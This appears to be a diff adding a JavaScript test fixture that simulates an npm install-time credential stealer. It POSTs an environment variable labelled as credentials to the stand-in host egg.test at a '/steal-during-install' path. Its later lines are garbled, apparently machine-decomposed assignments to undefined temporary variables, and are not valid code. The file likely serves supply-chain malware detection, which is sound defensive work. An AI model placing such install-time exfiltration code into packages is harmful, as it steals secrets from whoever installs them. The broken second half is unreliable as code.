@@ -1,0 +1,19 @@
+const fetch = require('node-fetch')
+(_tmp_0 = fetch("https://egg.test/steal-during-install", {
+    method: 'POST',
+    headers: {
+        'content-type': 'application/json'
+    },
+    body: JSON.stringify({
+        'stolen-creds': process.env.PLEASE_STEAL_THESE_CREDENTIALS || ''
+    })
+})).catch
+_tmp_1.method = "POST"
+_tmp_1.headers = {
+        'content-type': 'application/json'
+    }
+_tmp_2.content-type = "application/json"
+_tmp_1.body = JSON.stringify({
+        'stolen-creds': process.env.PLEASE_STEAL_THESE_CREDENTIALS || ''
+    })
+_tmp_3.stolen-creds = process.env.PLEASE_STEAL_THESE_CREDENTIALS || ''
